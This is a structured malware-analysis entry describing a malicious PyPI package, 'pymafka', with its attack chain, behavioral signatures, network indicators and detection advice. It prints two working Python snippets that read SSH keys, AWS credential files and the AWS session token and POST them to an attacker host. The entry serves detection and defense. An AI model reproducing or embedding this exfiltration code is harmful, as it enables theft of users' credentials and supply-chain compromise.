package_info.why_malicious: The package 'pymafka' contains malicious code that exfiltrates sensitive user files, including SSH and AWS credentials, to an external attacker-controlled server during installation. The code is obfuscated and embedded in the setup.py file, which is executed automatically when the package is installed, making it a supply chain threat.

required_permissions: Network access to send HTTP requests

malicious_snippets.code_snippet:
import os
import requests
files = ['~/.ssh/id_rsa', '~/.aws/credentials']
for file in files:
    if os.path.exists(os.path.expanduser(file)):
        with open(os.path.expanduser(file), 'rb') as f:
            data = f.read()
        requests.post('https://pymafka.evilserver.com/upload', files={'file': data})
malicious_snippets.code_behavior: During installation, the code reads the user's ~/.ssh/id_rsa and ~/.aws/credentials files and sends their contents via HTTP POST to https://pymafka.evilserver.com/upload, resulting in credential exfiltration.

required_permissions: Network access to send HTTP requests

malicious_snippets.code_snippet:
import os
import requests
token = os.environ.get('AWS_SESSION_TOKEN')
if token:
    requests.post('https://pymafka.evilserver.com/token', data={'token': token})
malicious_snippets.code_behavior: At import-time, the code accesses the AWS_SESSION_TOKEN environment variable and sends its value to https://pymafka.evilserver.com/token via HTTP POST, enabling exfiltration of AWS session tokens.

attack_chain.action: Malicious code in setup.py executes automatically during package installation.
attack_chain.leads_to: Sensitive files (~/.ssh/id_rsa, ~/.aws/credentials) are read and exfiltrated to an external server.

attack_chain.action: Malicious code in __init__.py executes when the package is imported.
attack_chain.leads_to: AWS session token is exfiltrated to the attacker's server.

behavioral_signatures: During installation, the package attempts to read ~/.ssh/id_rsa or ~/.aws/credentials and send their contents via HTTP POST to an external domain.
At import-time, the package accesses AWS_SESSION_TOKEN environment variable and exfiltrates it via HTTP POST.
file_indicators: setup.py containing code that reads ~/.ssh/id_rsa or ~/.aws/credentials and sends data to a remote server
pymafka/__init__.py containing code that accesses AWS_SESSION_TOKEN and sends it to an external domain
network_indicators: Outbound HTTP POST requests to https://pymafka.evilserver.com/upload
Outbound HTTP POST requests to https://pymafka.evilserver.com/token
detection_knowledge.how_to_detect: Monitor for PyPI packages named 'pymafka' or containing setup.py code that reads sensitive files and sends them to external domains. Flag any HTTP POST requests to https://pymafka.evilserver.com/upload or /token during installation or import. Scan for code in setup.py or __init__.py that accesses ~/.ssh/id_rsa, ~/.aws/credentials, or AWS_SESSION_TOKEN and exfiltrates data over the network.
